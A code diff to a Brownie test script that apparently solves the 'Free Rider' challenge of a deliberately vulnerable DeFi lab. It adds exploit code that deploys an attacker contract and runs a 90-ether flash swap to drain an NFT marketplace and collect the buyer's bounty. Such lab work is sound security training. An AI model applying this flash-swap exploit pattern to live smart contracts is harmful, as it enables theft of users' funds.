@@ -61,14 +61,24 @@ def before():
                              {"from": accounts[0]})
     nft_marketplace.offerMany([0,1,2,3,4,5], [NFT_BUY_PRICE for i in range(6)], {"from":accounts[0]})
     assert nft_marketplace.amountOfOffers() == 6
-    FreeRiderBuyer.deploy(ATTACKER.address, dvnft_address,
+    global free_rider
+    free_rider = FreeRiderBuyer.deploy(ATTACKER.address, dvnft_address,
                           {"amount": Wei("45 ether"),
                            "from": accounts[0]})
     
 
 def exploit():
-    pass
     
+    from brownie import attacker7
+
+    attacker_contract = attacker7.deploy(nft_marketplace.address, dv_nft.address, weth.address, uni_factory.address ,dv_token.address, free_rider.address, {"from": ATTACKER})
+
+    attacker_contract_address = attacker_contract.address
+
+    # flash swap
+    ATTACKER.transfer(attacker_contract, "1 ether")
+    attacker_contract.flashswap(Wei("90 ether"), {"from": ATTACKER, "gas_price": 100000000000000})
+
     
 def after():
     assert FreeRiderBuyer[-1].balance() == 0
